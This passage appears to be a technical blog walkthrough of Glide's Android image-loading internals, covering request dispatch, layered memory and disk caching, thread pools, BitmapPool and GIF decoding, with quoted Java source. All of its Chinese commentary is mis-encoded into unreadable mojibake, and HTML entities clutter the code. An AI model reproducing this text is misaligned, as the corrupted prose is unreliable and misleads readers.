method to store some metadata so that if a view is reused, any previous loads or resources from previous loads can be cancelled or reused. Any calls to View setTag(Object)on a View given to this class will result in excessive allocations and and/or IllegalArgumentExceptions. If you must call View#setTag(Object)on a view, consider using BaseTarget or SimpleTarget instead. ç¿»è¯‘ä¸€ä¸‹ï¼ŒViewTargetæä¾›äº†å°†Bitmap åŠ è½½è¿›Viewçš„å¤§éƒ¨åˆ†æ–¹æ³•çš„åŸºæœ¬å®ç°ï¼Œå¹¶ä¸”æ·»åŠ äº†onPreDrawListenerä»¥è·å¾—Viewçš„å°ºå¯¸ï¼Œå¯¹äºResuse Viewçš„åœºæ™¯ï¼Œé€šè¿‡setTagæ¥å–æ¶ˆè¢«æ»‘å‡ºå±å¹•çš„Viewçš„requestçš„åŠ è½½ã€‚ æ—¢ç„¶æä¾›äº†å¤§éƒ¨åˆ†æ–¹æ³•çš„é»˜è®¤å®ç°ï¼Œé‚£ä¹ˆä¸€å®šæœ‰æ–¹æ³•æ²¡å®ç°ï¼Œå…¶å®å°±æ˜¯protected void setResource(Z resource)å•¦ã€‚è¿™ä¸ªZå¯èƒ½æ˜¯Bitmap,GlideDrawableæˆ–è€…Drawableã€‚ç›´æ¥æ‹¿æ¥setImageBitmapæˆ–è€…setImageDrawableå°±å¯ä»¥äº†ï¼Œè¿™ä¸ªæ–¹æ³•å…¶å®åœ¨æ˜¯è§£ç å®Œæˆä¹‹åäº†ã€‚ å…³é”®æ˜¯default implementationæ˜¯æ€ä¹ˆå®ç°çš„ä»¥åŠè¿™äº›æ–¹æ³•åœ¨çˆ¶ç±»ä¸­çš„è°ƒç”¨æ—¶æœºã€‚ViewTargetçš„æ„é€ å‡½æ•°ä¼ è¿›æ¥ä¸€ä¸ªViewçš„å­ç±»ï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªSizeDeterminerï¼ˆåªæ˜¯é€šè¿‡onPreDrawListenerè·å¾—Viewçš„å®½å’Œé«˜ï¼‰ã€‚ å†å¾€ä¸Šæ‰¾çˆ¶ç±» public abstract class BaseTarget&lt;Z&gt; implements Target&lt;Z&gt; { //æ·»åŠ äº†ä¸€ä¸ªRequestæˆå‘˜å˜é‡ï¼Œä¸ºTargetä¸­çš„ä¸€äº›æ–¹æ³•æä¾›äº†ç©ºå®ç°ï¼Œæ¯”å¦‚onLoadStartedï¼ŒonLoadXXXç­‰ private Request request; } åˆ°è¿™é‡Œï¼Œè¿˜åªæ˜¯é…ç½®èµ„æºè¦åŠ è½½è¿›çš„å¯¹è±¡ï¼Œæˆ‘å€¾å‘äºæŠŠTargetçœ‹æˆä¸€ä¸ªèµ„æºåŠ è½½å®Œæ¯•çš„ä¸­è½¬è€…ï¼Œå®ƒç®¡ç†äº†Viewï¼ˆä¹Ÿå¯ä»¥æ²¡æœ‰Viewï¼‰å’ŒRequestï¼Œåœ¨å¤–éƒ¨è°ƒç”¨Target.onLoadStartedç­‰æ–¹æ³•æ˜¯ï¼Œè°ƒç”¨View(å¦‚æœæœ‰çš„è¯)çš„xxxæ–¹æ³•ã€‚ 3.2ä»»åŠ¡åˆ†å‘ public &lt;Y extends Target&lt;TranscodeType&gt;&gt; Y into(Y target) { Util.assertMainThread(); //è¿˜åœ¨ä¸»çº¿ç¨‹ä¸Š Request previous = target.getRequest(); if (previous != null) { //æ¯ä¸€ä¸ªTargetéƒ½åªæœ‰ä¸€ä¸ªRequestï¼Œç”¨äºæ¸…é™¤ä¹‹å‰çš„è¯·æ±‚ previous.clear(); requestTracker.removeRequest(previous); previous.recycle(); } Request request = buildRequest(target); target.setRequest(request); lifecycle.addListener(target); requestTracker.runRequest(request); return target; //è¿™é‡Œè¿”å›Targetçš„å¥½å¤„åœ¨äºå¯ä»¥æ¥ç€é“¾å¼è°ƒç”¨ï¼Œä¸Šé¢åªæ˜¯æ·»åŠ åˆ°ä»»åŠ¡é˜Ÿåˆ—ï¼ŒçœŸæ­£è¢«å¤„ç†è¿˜å¾—ç­‰åˆ°ä¸‹ä¸€å¸§(onPreDrawè°ƒç”¨æ—¶)ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜å¯ä»¥æ¥ç€å¯¹è¿™ä¸ªTargetè¿›è¡Œé…ç½® } æ³¨æ„ requestTracker.runRequest(request)æ–¹æ³•GenericRequest.java /** * {@inheritDoc} */ @Override public void begin() { startTime = LogTime.getLogTime(); if (model == null) { onException(null); return; } status = Status.WAITING_FOR_SIZE; if (Util.isValidDimensions(overrideWidth, overrideHeight)) { onSizeReady(overrideWidth, overrideHeight); } else { target.getSize(this); //è¿™ä¸ªæ–¹æ³•å…¶å®å°±ç­‰äºæŒ‚äº†ä¸ªé’©å­åœ¨onPreDrawä¸­è°ƒç”¨ï¼ŒonPreDrawæ—¶ä¼šè°ƒç”¨onSizeReadyã€‚ } if (!isComplete() &amp;&amp; !isFailed() &amp;&amp; canNotifyStatusChanged()) { target.onLoadStarted(getPlaceholderDrawable()); } if (Log.isLoggable(TAG, Log.VERBOSE)) { logV(&quot;finished run method in &quot; + LogTime.getElapsedMillis(startTime)); } } onSizeReadyæ‰æ˜¯çœŸæ­£å¼€å§‹å¹²æ´»çš„æ—¶æœºï¼Œç†ç”±ä¹Ÿå¾ˆå……åˆ†ã€‚è§£ç Bitmapå¿…é¡»è¦çŸ¥é“éœ€è¦å¤šå¤§çš„å°ºå¯¸ï¼Œå¦åˆ™ä¹Ÿæ˜¯ç™½æ­ã€‚GenericRequest.java /** * A callback method that should never be invoked directly. */ @Override public void onSizeReady(int width, int height) { if (status != Status.WAITING_FOR_SIZE) { return; } status = Status.RUNNING; width = Math.round(sizeMultiplier * width); //è¿™ä¸ªsizeMultiplierå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨é…ç½® height = Math.round(sizeMultiplier * height); ModelLoader&lt;A, T&gt; modelLoader = loadProvider.getModelLoader(); final DataFetcher&lt;T&gt; dataFetcher = modelLoader.getResourceFetcher(model, width, height); ResourceTranscoder&lt;Z, R&gt; transcoder = loadProvider.getTranscoder(); loadedFromMemoryCache = true; loadStatus = engine.load(signature, width, height, dataFetcher, loadProvider, transformation, transcoder, priority, isMemoryCacheable, diskCacheStrategy, this); loadedFromMemoryCache = resource != null; if (Log.isLoggable(TAG, Log.VERBOSE)) { logV(&quot;finished onSizeReady in &quot; + LogTime.getElapsedMillis(startTime)); } } 3.3 ç¼“å­˜æŸ¥æ‰¾å¼€å§‹æŸ¥æ‰¾ç¼“å­˜æ˜¯engine.loadå¼€å§‹çš„ï¼Œæ‰¾åˆ°äº†å°±è°ƒç”¨Callbackçš„onResourceReadyEngine.java public &lt;T, Z, R&gt; LoadStatus load(Key signature, int width, int height, DataFetcher&lt;T&gt; fetcher, DataLoadProvider&lt;T, Z&gt; loadProvider, Transformation&lt;Z&gt; transformation, ResourceTranscoder&lt;Z, R&gt; transcoder, Priority priority, boolean isMemoryCacheable, DiskCacheStrategy diskCacheStrategy, ResourceCallback cb) { Util.assertMainThread(); //è¿˜æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸Š long startTime = LogTime.getLogTime(); final String id = fetcher.getId();//å¦‚æœæ˜¯ä¸ªç½‘ç»œå›¾ç‰‡ï¼Œè¿”å›ç½‘ç»œurlï¼Œç±»ä¼¼è¿™ç§ EngineKey key = keyFactory.buildKey(id, signature, width, height, loadProvider.getCacheDecoder(), loadProvider.getSourceDecoder(), transformation, loadProvider.getEncoder(), transcoder, loadProvider.getSourceEncoder()); EngineResource&lt;?&gt; cached = loadFromCache(key, isMemoryCacheable); //EngineResourceå†…éƒ¨wrapäº†çœŸæ­£çš„Resourceï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªint acquireè¡¨ç¤ºå½“å‰æ­£åœ¨å ç”¨èµ„æºçš„ä½¿ç”¨è€…æ•°ã€‚å½“è¿™ä¸ªæ•°ä¸º0çš„æ—¶å€™å¯ä»¥releaseã€‚ if (cached != null) { cb.onResourceReady(cached); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Loaded resource from cache&quot;, startTime, key); } return null; } // ä¸ºä»€ä¹ˆåœ¨å·²ç»æœ‰äº†Cacheè¿™ä¸€å±‚ç¼“å­˜ä¹‹åï¼Œè¿˜è¦è®¾ç½®ä¸€ä¸ªActiveResourcesç¼“å­˜ã€‚æ˜¯å› ä¸ºloadFromCacheé‡Œé¢è°ƒç”¨äº†LinkedHashMapçš„removeæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ç§é©¬ä¸Šè¦ç”¨çš„èµ„æºå½“ç„¶è¦cacheåœ¨å¦ä¸€ä»½ç¼“å­˜é‡Œ EngineResource&lt;?&gt; active = loadFromActiveResources(key, isMemoryCacheable); if (active != null) { cb.onResourceReady(active); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Loaded resource from active resources&quot;, startTime, key); } return null; } EngineJob current = jobs.get(key); if (current != null) { current.addCallback(cb); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Added to existing load&quot;, startTime, key); } return new LoadStatus(cb, current); } EngineJob engineJob = engineJobFactory.build(key, isMemoryCacheable); DecodeJob&lt;T, Z, R&gt; decodeJob = new DecodeJob&lt;T, Z, R&gt;(key, width, height, fetcher, loadProvider, transformation, transcoder, diskCacheProvider, diskCacheStrategy, priority); EngineRunnable runnable = new EngineRunnable(engineJob, decodeJob, priority); jobs.put(key, engineJob); engineJob.addCallback(cb); engineJob.start(runnable); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Started new load&quot;, startTime, key); } return new LoadStatus(cb, engineJob); } Engineå…ˆå»Cacheé‡Œé¢æŸ¥æ‰¾ï¼Œæ‰¾åˆ°äº†ç›´æ¥è°ƒç”¨ResourceCallback(GenericRequest)çš„onResourceReady(EngineResource&lt;?&gt; resource)ï¼Œæ³¨æ„è¿™ä¸ªEngineResourceé‡Œé¢åŒ…è£…äº†ä¸€ä¸ªResourceï¼Œä¸»è¦æ˜¯ä¸ºäº†å¼•ç”¨è®¡æ•°ã€‚ Engineçš„loadFromCache(key, isMemoryCacheable)æ˜¯ç¬¬ä¸€æ­¥ï¼Œä»æˆå‘˜å˜é‡cacheä¸­è·å–ã€‚æ‰¾åˆ°äº†å°±æŒªåˆ°activeResourcesé‡Œé¢ã€‚ Engine.java public class Engine implements EngineJobListener, MemoryCache.ResourceRemovedListener, EngineResource.ResourceListener { private static final String TAG = &quot;Engine&quot;; private final Map&lt;Key, EngineJob&gt; jobs; private final EngineKeyFactory keyFactory; private final MemoryCache cache; private final EngineJobFactory engineJobFactory; private final Map&lt;Key, WeakReference&lt;EngineResource&lt;?&gt;&gt;&gt; activeResources; private final ResourceRecycler resourceRecycler; private final LazyDiskCacheProvider diskCacheProvider; } EngineResource&lt;?&gt; active = loadFromActiveResources(key, isMemoryCacheable); //4.8çš„glideæ˜¯å…ˆä»è¿™ä¸ªå¼•ç”¨è®¡æ•°é‡Œé¢æ‰¾EngineResource&lt;?&gt; cached = loadFromCache(key, isMemoryCacheable); //ç„¶åå†ä»com.bumptech.glide.utilã€‚LruCacheè¿™ä¸ªç±»ä¸­æ‰¾. è¿™ä¸ªMemoryCacheæ˜¯ä¸€ä¸ªLruCacheï¼Œå¤§å°æ˜¯åœ¨MemorySizeCalculatorä¸­è·å¾—çš„ï¼Œå¯¹äºä¸€èˆ¬çš„è®¾å¤‡ï¼ŒactivityManager.getMemoryClass() 1024 1024è·å¾—æ¯ä¸ªAppèƒ½å¤Ÿä½¿ç”¨çš„Size,ä¹˜ä»¥0.4ã€‚ MemorySizeCalculator(Context context, ActivityManager activityManager, ScreenDimensions screenDimensions) { this.context = context; final int maxSize = getMaxSize(activityManager); final int screenSize = screenDimensions.getWidthPixels() * screenDimensions.getHeightPixels() * BYTES_PER_ARGB_8888_PIXEL; //ç®—å‡ºå æ»¡æ•´ä¸ªå±å¹•çš„ä¸€å¼ å›¾çš„å¤§å° int targetPoolSize = screenSize * BITMAP_POOL_TARGET_SCREENS; //ä¹˜ä»¥4å°±æ˜¯bitmappoolçš„å¤§å° int targetMemoryCacheSize = screenSize * MEMORY_CACHE_TARGET_SCREENS; //ä¹˜ä»¥2å°±æ˜¯MemoryCacheçš„å¤§å° if (targetMemoryCacheSize + targetPoolSize &lt;= maxSize) { memoryCacheSize = targetMemoryCacheSize; bitmapPoolSize = targetPoolSize; } else { //è¿™é‡Œåˆ¤æ–­äº†BitmapPoolå’ŒMemoryCacheçš„å¤§å°ä¹‹å’Œä¸èƒ½è¶…å‡ºåº”ç”¨å¯ä»¥ä½¿ç”¨çš„å†…å­˜å¤§å°çš„0.4å€ã€‚ int part = Math.round((float) maxSize / (BITMAP_POOL_TARGET_SCREENS + MEMORY_CACHE_TARGET_SCREENS)); memoryCacheSize = part * MEMORY_CACHE_TARGET_SCREENS; bitmapPoolSize = part * BITMAP_POOL_TARGET_SCREENS; } } æ‰€ä»¥ç¼“å­˜çš„å¤§å°ç»¼åˆè€ƒè™‘äº†å±å¹•åˆ†è¾¨ç‡å’Œå†…å­˜å¤§å°ã€‚åªè¦å±å¹•åƒç´ ä¸æ˜¯ç‰¹åˆ«é«˜ï¼Œä¸€èˆ¬éƒ½ä¼šèµ°åˆ°ç¬¬ä¸€æ­¥ã€‚ //setTagä¼šå´©çš„ä»£ç æºå¤´åœ¨ViewTargeté‡Œé¢,å…¶å®åœ¨intoæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨åˆ°è¿™é‡Œï¼Œä¸»è¦æ˜¯ä¸ºäº†å»æ£€æŸ¥previous @Override @Nullable public Request getRequest() { Object tag = getTag(); Request request = null; if (tag != null) { if (tag instanceof Request) { request = (Request) tag; } else { throw new IllegalArgumentException( &quot;You must not call setTag() on a view Glide is targeting&quot;); } } return request; } å°ç»“ ViewTargeté‡Œé¢æœ‰ä¸€ä¸ª T extends Viewï¼Œå¯è§Glideä¸åªé€‚ç”¨äºImageViewã€‚ BaseTargeté‡Œå¸¦äº†ä¸€ä¸ªprivate Requestï¼Œå…¶å­ç±»å¯ä»¥é€šè¿‡getRequestè·å¾—ã€‚ å¯¹äºListViewç­‰å¯ä»¥å¿«é€Ÿæ»‘åŠ¨çš„Viewï¼Œå¦‚æœæŸä¸€ä¸ªViewè¢«æ»‘å‡ºå±å¹•å¤–ï¼Œè‡ªåŠ¨å–æ¶ˆè¯·æ±‚(é€šè¿‡setTagIdå®ç°) â€œYou must not call setTag() on a view Glide is targetingâ€ setTagä¼šå´©ï¼ŒåŸå› æ˜¯GenericRequestBuilderçš„intoæ–¹æ³•ä¼šé€šè¿‡ViewTargetå»æŸ¥æ‰¾previousï¼Œçœ‹çœ‹è¿™ä¸€ä¸ªViewTargetæ˜¯å¦å·²ç»æœ‰äº†requestã€‚è¿™ä¸€ç‚¹å¸¸è§äºå¾ªç¯åˆ©ç”¨Viewçš„åœºæ™¯ï¼Œå¿«é€Ÿæ»‘åŠ¨çš„ViewGroupä¼šå¤ç”¨Viewã€‚å¯¹äºåŒä¸€ä¸ªViewï¼Œå¯èƒ½ViewGroupä¼šéœ€è¦å®ƒå±•ç¤ºä¸åŒçš„(å›¾ç‰‡ã€Url)ï¼Œæ‰€ä»¥Glideå¿…é¡»è¦æ£€æŸ¥previousï¼ŒåŒæ—¶æ¸…é™¤æ‰æ—§çš„è¯·æ±‚ã€‚ GenericRequestBuilderçš„obtainRequestå†…éƒ¨ä½¿ç”¨äº†ä¸€ä¸ªArrayDequeæ¥obtain Requestã€‚è¿™æ ·Requestå®ä¾‹ä¸ä¼šå¤šæ¬¡åˆ›å»ºï¼Œå›æ”¶æ˜¯åœ¨request.recycleé‡Œé¢åšçš„ã€‚ 4. ç¦»å¼€ä¸»çº¿ç¨‹ï¼Œæäº¤ä»»åŠ¡åˆ°çº¿ç¨‹æ± å¦‚æœä¸Šé¢ä¸¤å±‚ç¼“å­˜éƒ½æ²¡æ‰¾åˆ°ï¼Œå»jobsé‡Œæ‰¾çœ‹ä¸‹æœ‰æ²¡æœ‰å·²ç»åŠ å…¥é˜Ÿåˆ—çš„EngineJobè®°ä½ä¸Šé¢æœ‰ä¸¤å±‚ç¼“å­˜ æ¥çœ‹åé¢æäº¤ä»»åŠ¡è¿™å‡ æ®µ EngineJob engineJob = engineJobFactory.build(key, isMemoryCacheable); DecodeJob&lt;T, Z, R&gt; decodeJob = new DecodeJob&lt;T, Z, R&gt;(key, width, height, fetcher, loadProvider, transformation, transcoder, diskCacheProvider, diskCacheStrategy, priority); EngineRunnable runnable = new EngineRunnable(engineJob, decodeJob, priority); jobs.put(key, engineJob); engineJob.addCallback(cb); engineJob.start(runnable); //å¾€diskCacheServiceæäº¤äº†ä¸€ä¸ªRunnable class EngineJob implements EngineRunnable.EngineRunnableManager { private static final EngineResourceFactory DEFAULT_FACTORY = new EngineResourceFactory(); private static final Handler MAIN_THREAD_HANDLER = new Handler(Looper.getMainLooper(), new MainThreadCallback()); private static final int MSG_COMPLETE = 1; private static final int MSG_EXCEPTION = 2; private final List&lt;ResourceCallback&gt; cbs = new ArrayList&lt;ResourceCallback&gt;(); private final EngineResourceFactory engineResourceFactory; private final EngineJobListener listener; private final Key key; private final ExecutorService diskCacheService; //çº¿ç¨‹æ±  private final ExecutorService sourceService; //çº¿ç¨‹æ±  private final boolean isCacheable; private boolean isCancelled; // Either resource or exception (particularly exception) may be returned to us null, so use booleans to track if // we&#39;ve received them instead of relying on them to be non-null. See issue #180. private Resource&lt;?&gt; resource; private boolean hasResource; private Exception exception; private boolean hasException; // A set of callbacks that are removed while we&#39;re notifying other callbacks of a change in status. private Set&lt;ResourceCallback&gt; ignoredCallbacks; private EngineRunnable engineRunnable; private EngineResource&lt;?&gt; engineResource; private volatile Future&lt;?&gt; future; } EngineJobæ˜¯é€šè¿‡Factoryåˆ›å»ºçš„ï¼Œåˆ›å»ºæ—¶ä¼šä¼ ä¸¤ä¸ªçº¿ç¨‹æ± è¿›æ¥ã€‚ä¸€ä¸ªç®¡DiskCache,ä¸€ä¸ªç®¡Sourceè·å–ã€‚åˆå§‹åŒ–æ˜¯åœ¨Glide.createGlideé‡Œé¢åšçš„ï¼š if (sourceService == null) { final int cores = Math.max(1, Runtime.getRuntime().availableProcessors()); sourceService = new FifoPriorityThreadPoolExecutor(cores); } if (diskCacheService == null) { diskCacheService = new FifoPriorityThreadPoolExecutor(1); } åœ¨å¤–éƒ¨æ²¡æœ‰æä¾›çº¿ç¨‹æ± çš„æƒ…å†µä¸‹ï¼ŒDiskCacheä¸€ä¸ªçº¿ç¨‹æ± å°±å¥½äº†ï¼ŒSourceServiceçš„å¤§å°ä¸ºå½“å‰cpuå¯ç”¨æ ¸å¿ƒæ•°ï¼Œè¿˜æ˜¯æ¯”è¾ƒé«˜æ•ˆçš„ã€‚debugçš„æ—¶å€™å¯èƒ½ä¼šçœ‹è§â€œfifo-pool-thread-1â€è¿™æ ·çš„çº¿ç¨‹ï¼Œå°±æ˜¯Glideçš„ã€‚ä¸Šé¢æ˜¯å¾€DiskCacheServiceæäº¤äº†ä¸€ä¸ªEngineRunableï¼Œè¿™ä¸ªRunnableçš„runé‡Œé¢ä¸»è¦æ˜¯decodeFromCacheå’ŒDecodeFroSourceï¼Œåˆ†åˆ«ä»£è¡¨ä»ç£ç›˜ç¼“å­˜è·å–å’Œä»æ•°æ®æºè·å–ã€‚é¦–å…ˆä¼šè°ƒç”¨decodeFromCacheï¼Œä¸€å±‚å±‚å¾€ä¸‹æ‰¾ï¼Œå¦‚æœæ²¡æ‰¾åˆ°çš„è¯ä¼šè°ƒç”¨onLoadFailedæ–¹æ³•ï¼Œå¹¶å°†ä»»åŠ¡æäº¤ç»™SourceServiceï¼Œå»è·å–èµ„æºã€‚ 4.1 CacheServiceè¿™ä¸ªçº¿ç¨‹æ± çš„å·¥ä½œä»¥åŠç¬¬ä¸‰å±‚ç¼“å­˜çš„å‡ºç°æ³¨æ„è¿™é‡Œå‡ºç°äº†ç¬¬ä¸‰å±‚ç¼“å­˜ File cacheFile = diskCacheProvider.getDiskCache().get(key); è¿™ä¸€å±‚ç¼“å­˜æ˜¯ç»™DiskCacheçš„çº¿ç¨‹æ± æŸ¥æ‰¾ç”¨çš„ï¼ŒæŸ¥æ‰¾çš„æ—¶å€™åˆ†ä¸ºä»Resultä¸­æŸ¥æ‰¾å’Œä»Sourceä¸­æŸ¥æ‰¾ï¼Œå…¶å®æŸ¥æ‰¾çš„ç›®çš„åœ°éƒ½æ˜¯é‚£ä¸ªDiskCacheï¼ŒResulæ˜¯ç”¨ResultKeyå»æ‰¾çš„ï¼ŒSourceæ˜¯ç”¨ResultKey.getOriginalKeyå»æŸ¥æ‰¾çš„ã€‚ç‰©ç†ä½ç½®éƒ½æ”¾åœ¨é‚£ä¸ªç£ç›˜ç›®å½•ä¸‹ã€‚ å¦å¤–åœ¨DecodeJobçš„cacheAndDecodeSourceDataæ–¹æ³•é‡Œï¼Œå­˜çš„åªæ˜¯origin(å› ä¸ºç”¨çš„æ˜¯origin Key)ï¼Œç„¶åå†æ‹¿ç€originKeyå»ç£ç›˜æ‰¾ï¼Œæ‰¾å‡ºæ¥decodeã€‚ DecodeFromCacheåˆåŒ…æ‹¬ä¸¤æ­¥decodeResultFromCacheå’ŒdecodeSourceFromCacheï¼Œè¿™å°±è®©äººæƒ³åˆ°Glideçš„DiskCacheStrategyåˆ†ä¸ºResultå’ŒSourceï¼Œå³å¯ä»¥ç¼“å­˜decodeç»“æœä¹Ÿå¯ä»¥ç¼“å­˜decodeä¹‹å‰çš„sourceã€‚å‰ææ˜¯åœ¨ä¸Šé¢çš„diskCacheProvider.getDiskCache().get(key)æ–¹æ³•é‡Œé¢æ‰¾åˆ°äº†CachedFileã€‚è¿™ä¸ªè·¯å¾„åœ¨InternalCacheDiskCacheFactoryé‡Œé¢å†™äº†å…·ä½“çš„è·¯å¾„ public InternalCacheDiskCacheFactory(final Context context, final String diskCacheName, int diskCacheSize) { super(new CacheDirectoryGetter() { @Override public File getCacheDirectory() { File cacheDirectory = context.getCacheDir(); if (cacheDirectory == null) { return null; } if (diskCacheName != null) { return new File(cacheDirectory, diskCacheName); //å°±æ˜¯context.getCacheDir+&quot;image_manager_disk_cache&quot; //é»˜è®¤ä¸Šé™æ˜¯250MB //ç”±äºè¿™ä¸ªCacheæ”¾åœ¨CacheDiré‡Œé¢ï¼Œå…¶ä»–åº”ç”¨æ‹¿ä¸åˆ° } return cacheDirectory; } }, diskCacheSize); } æ³¨æ„æ— è®ºæ˜¯decodeResultFromCacheè¿˜æ˜¯decodeSourceFromCacheé‡Œéƒ½æœ‰ç±»ä¼¼çš„ä¸€æ®µï¼š Resource&lt;T&gt; transformed = loadFromCache(resultKey); Resource&lt;Z&gt; result = transcode(transformed); ///æŠŠä¸€ç§èµ„æºè½¬æˆå¦ä¸€ç§èµ„æºï¼Œæ¯”å¦‚æŠŠBitmapçš„Resourceè½¬æˆä¸€ä¸ªByteResource 4.2 SourceServiceè¿™ä¸ªçº¿ç¨‹æ± ä»¥åŠBitmapPoolè¿™ä¸€å±‚ç¼“å­˜çš„å‡ºç° private Resource&lt;T&gt; decodeFromSourceData(A data) throws IOException { final Resource&lt;T&gt; decoded; if (diskCacheStrategy.cacheSource()) { decoded = cacheAndDecodeSourceData(data); } else { long startTime = LogTime.getLogTime(); decoded = loadProvider.getSourceDecoder().decode(data, width, height); // è¿™é‡Œé¢æ”¾è¿›BitmapPooläº† if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Decoded from source&quot;, startTime); } } return decoded; } ç¬¬å››å±‚ç¼“å­˜å‡ºç°ã€‚ã€‚ã€‚LruBitmapPoolDecodeFromSourceä¹Ÿæ˜¯ç±»ä¼¼ï¼Œåˆ¤æ–­æ˜¯å¦å…è®¸Cacheï¼Œé€šè¿‡DataFetcherè·å–æ•°æ®è¿™ä¸ªæ•°æ®å¯èƒ½æ˜¯InputStreamï¼Œä¹Ÿå¯èƒ½æ˜¯ImageVideoWrapperã€‚ã€‚ã€‚æ€»ä¹‹æ˜¯ä¸€ä¸ªå¯ä»¥æä¾›æ•°æ®çš„æ¥æºã€‚å¦‚æœå¯ä»¥Cacheçš„è¯ï¼Œå…ˆæŠŠæ•°æ®å†™åˆ°lrué‡Œé¢ï¼Œç„¶åä»lrué‡Œé¢å–å‡ºæ¥ï¼Œä»Source decodeæˆæƒ³è¦çš„æ•°æ®ç±»å‹ã€‚ä¾‹å¦‚ä»Streamè½¬æˆBitmapæ˜¯è¿™ä¹ˆå¹²çš„StreamBitmapDecoder.java @Override public Resource&lt;Bitmap&gt; decode(InputStream source, int width, int height) { Bitmap bitmap = downsampler.decode(source, bitmapPool, width, height, decodeFormat); return BitmapResource.obtain(bitmap, bitmapPool); } é¡ºä¾¿è¿˜æ”¾è¿›äº†LruBitmapPoolï¼ˆåˆä¸€ä¸ªå®ç°äº†lruç®—æ³•çš„ç¼“å­˜ï¼‰ï¼ŒBitmapå­˜åœ¨ä¸€ä¸ªLruPoolStrategyæ¥å£å®ä¾‹çš„GroupedLinkedMapä¸­ã€‚ 4.3 å›åˆ°ä¸»çº¿ç¨‹EngineRunnableçš„runæ–¹æ³•è·‘åœ¨å­çº¿ç¨‹ï¼Œåœ¨runçš„æœ€åå°±æ˜¯ç”¨ä¸€ä¸ªhandleræ¨åˆ°ä¸»çº¿ç¨‹äº†ã€‚æœ‰å¯èƒ½æ˜¯ä»CacheServiceè¿™ä¸ªçº¿ç¨‹æ± é‡Œé¢çš„çº¿ç¨‹æ¨è¿‡å»çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯SourceSeviceè¿™ä¸ªçº¿ç¨‹æ± é‡Œé¢æ¨è¿‡å»çš„ã€‚ onResourceReadyæœ€ç»ˆä¼šèµ°åˆ°GenericRequestçš„onResourceReadyæ–¹æ³•é‡Œ private void onResourceReady(Resource&lt;?&gt; resource, R result) { if (requestListener == null || !requestListener.onResourceReady(result, model, target, loadedFromMemoryCache, isFirstResource)) { GlideAnimation&lt;R&gt; animation = animationFactory.build(loadedFromMemoryCache, isFirstResource); target.onResourceReady(result, animation); //æ³¨æ„è¿™å¥è¯å°±å¯ä»¥äº† } } æœ€ç»ˆä¼šè°ƒåˆ°ImageViewTarget,AppWidgetTargetç­‰Targetï¼ˆæŒæœ‰Requestå’ŒView,Viewå¯èƒ½æ²¡æœ‰ï¼‰ï¼Œè¿™æ—¶å€™ï¼Œç›´æ¥è°ƒç”¨ImageView.setImagBitmapç­‰æ–¹æ³•å°±å¯ä»¥äº†ã€‚å›¾ç‰‡è®¾ç½®å®Œæ¯•ã€‚ 5. Glideé™¤äº†æ™®é€šçš„åŠ è½½æ–¹æ³•ï¼Œè¿˜èƒ½ç”¨ä»€ä¹ˆæ¯”è¾ƒæœ‰æ„æ€çš„ç©æ³• 1.GlideåŠ è½½Gifçš„åŸç†åœ¨GifDecoderçš„ public synchronized Bitmap getNextFrame()æ–¹æ³•é‡Œï¼ŒGifæœ¬è´¨ä¸Šæ˜¯ä¸€å¸§å¸§çš„Frameæ•°æ®ï¼ŒGlideå°†è¿™äº›æ•°æ®åŒ…è£…åˆ°GifFrameè¿™ä¸ªç±»ä¸­ï¼Œæ¯æ¬¡æƒ³è¦è·å¾—ä¸‹ä¸€å¸§çš„æ—¶å€™ï¼Œå°±ä»bitmapPoolä¸­obtain Bitmap,åŒæ—¶ä»Frameä¸­æå–å¿…è¦ä¿¡æ¯å¡«å……bitmap.Gifçš„æ˜¾ç¤ºæ˜¯åœ¨GifDrawableçš„drawæ–¹æ³•é‡Œé¢é€šè¿‡frameLoader.getCurrentFrame()è·å¾—å½“å‰å¸§çš„bitmapã€‚android.graphics.Movieä¹Ÿèƒ½åŠ è½½gifå›¾ç‰‡ã€‚åªæ˜¯Movieé‡Œé¢éƒ½æ˜¯äº›nativeæ–¹æ³•ï¼Œglideçš„GifHeaderParser.javaä¸­çš„readContentsæ–¹æ³•é‡Œé¢ç”¨javaæ–¹æ³•å®ç°äº†å¯¹gifå¸§çš„è¯»å–ã€‚ä»GifDecoder.readè¿™ä¸ªæ–¹æ³•å¼€å§‹è¯»å°±å¥½äº† 2.GlideDrawableImageViewTargetä¸­æœ‰è¿™ä¹ˆä¸€æ®µæ³¨é‡Šï¼š @Override public void onResourceReady(GlideDrawable resource, GlideAnimation&lt;? super GlideDrawable&gt; animation) { if (!resource.isAnimated()) { //TODO: Try to generalize this to other sizes/shapes. // This is a dirty hack that tries to make loading square thumbnails and then square full images less costly // by forcing both the smaller thumb and the larger version to have exactly the same intrinsic dimensions. // If a drawable is replaced in an ImageView by another drawable with different intrinsic dimensions, // the ImageView requests a layout. Scrolling rapidly while replacing thumbs with larger images triggers // lots of these calls and causes significant amounts of jank. float viewRatio = view.getWidth() / (float) view.getHeight(); float drawableRatio = resource.getIntrinsicWidth() / (float) resource.getIntrinsicHeight(); if (Math.abs(viewRatio - 1f) &lt;= SQUARE_RATIO_MARGIN &amp;&amp; Math.abs(drawableRatio - 1f) &lt;= SQUARE_RATIO_MARGIN) { resource = new SquaringDrawable(resource, view.getWidth()); } } super.onResourceReady(resource, animation); this.resource = resource; resource.setLoopCount(maxLoopCount); resource.start(); } Glideè¿˜å¯ä»¥ç”¨æ¥çº¯ç²¹çš„è§£ç è·å¾—Bitmap. Glide.with(itemView.getContext()) //ä¸ç”¨æ‹…å¿ƒleak,RequestManageråªæ˜¯é€šè¿‡è¿™ä¸ªcontextè·å¾—äº†ApplicationContextï¼Œä¿ç•™ä¸‹æ¥çš„æ˜¯Applicationçš„context .load(R.drawable.image_41) .asBitmap() .centerCrop().into(new SimpleTarget&lt;Bitmap&gt;() { @Override public void onResourceReady(Bitmap 